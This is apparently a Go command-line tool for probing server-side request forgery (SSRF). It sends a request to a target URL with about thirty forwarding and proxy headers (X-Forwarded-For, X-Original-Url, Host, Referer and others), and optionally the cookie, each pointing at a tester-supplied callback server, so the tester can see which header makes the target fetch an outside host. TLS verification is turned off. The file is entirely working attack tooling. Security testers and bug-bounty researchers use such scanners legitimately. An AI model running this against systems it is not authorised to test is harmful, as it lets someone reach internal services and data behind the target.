package main

import (
    "fmt"
    "os"
    "net/url"
    "net/http"
    "log"
    "net/http/httputil"
//    "io/ioutil"
    "strings"
//    "bufio"
    "crypto/tls"
)


func ssrf(url1,server,cookie1 string) {

         http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
         client := &http.Client{}
         req, err := http.NewRequest("GET",url1, nil)
         req.Header.Add("Proxy-Host", server+"_Proxy-Host.txt")
         req.Header.Add("Request-Uri", server+"_Request-Uri.txt")
         req.Header.Add("X-Forwarded", server+"_X-Forwarded.txt")
         req.Header.Add("X-Forwarded-By", server+"_X-Forwarded-By.txt")
         req.Header.Add("X-Forwarded-For", server+"_X-Forwarded-For.txt")
         req.Header.Add("X-Forwarded-For-Original", server+"_X-Forwarded-For-Original.txt")
         req.Header.Add("X-Forwarded-Host", server+"_X-Forwarded-Host.txt")
         req.Header.Add("X-Forwarded-Server", server+"_X-Forwarded-Server.txt")
         req.Header.Add("X-Forwarder-For", server+"_X-Forwarder-For.txt")
         req.Header.Add("X-Forward-For", server+"_X-Forward-For.txt")
         req.Header.Add("Base-Url", server+"_Base-Url.txt")
         req.Header.Add("Http-Url", server+"_Http-Url.txt")
         req.Header.Add("Proxy-Url", server+"_Proxy-Url.txt")
         req.Header.Add("Redirect", server+"_Redirect.txt")
         req.Header.Add("Real-Ip", server+"_Real-Ip.txt")
         req.Header.Add("Referer", server+"_Referer.txt")
         req.Header.Add("Referrer", server+"_Referrer.txt")
         req.Header.Add("Refferer", server+"_Refferer.txt")
         req.Header.Add("Uri", server+"_Uri.txt")
         req.Header.Add("Url", server+"_Url.txt")
         req.Header.Add("X-Host", server+"_X-Host.txt")
         req.Header.Add("X-Http-Destinationurl", server+"_X-Http-Destinationurl.txt")
         req.Header.Add("X-Http-Host-Override", server+"_X-Http-Host-Override.txt")
         req.Header.Add("X-Original-Remote-Addr", server+"_X-Original-Remote-Addr.txt")
         req.Header.Add("X-Original-Url", server+"_X-Original-Url.txt")
         req.Header.Add("X-Proxy-Url", server+"_X-Proxy-Url.txt")
         req.Header.Add("X-Rewrite-Url", server+"_X-Rewrite-Url.txt")
         req.Header.Add("X-Real-Ip", server+"_X-Real-Ip.txt")
         req.Header.Add("X-Remote-Addr", server+"_X-Remote-Addr.txt")
         req.Header.Add("Host", server+"_Host.txt")
         req.Header.Add("Cookie", cookie1)

         res,err := client.Do(req)

         if err != nil{
            log.Fatal(err)
         }

         requestDump, err := httputil.DumpRequest(req, true)
         if err != nil {
              fmt.Println(err)
         }
         fmt.Println(string(requestDump))
         fmt.Println(url1,res.StatusCode)
//         reqBody, err := ioutil.ReadAll(res.Body)
//         if err != nil {
//                          log.Fatal(err)
//         }
//         fmt.Printf("%s", reqBody)
}

func main() {
//              file, err := os.Open(os.Args[1])
//              if err != nil {
//                 log.Fatal(err)
//              }
//              defer file.Close()
//              scanner := bufio.NewScanner(file)
//              for scanner.Scan() {
//                 str := scanner.Text()

                 str:=os.Args[1]
                 server_test := os.Args[2]
                 u, err := url.Parse(str)
                 if err != nil {
                      panic(err)
                 }
                 res1 := strings.Replace(u.Host, ".", "_",-1)
                 server1:=server_test+"/"+res1 
                 cookie:=os.Args[3]
                 if cookie == "1" {
                    ssrf(str,server1,server1)
                 }else{
                    ssrf(str,server1,os.Args[3])
                }


}
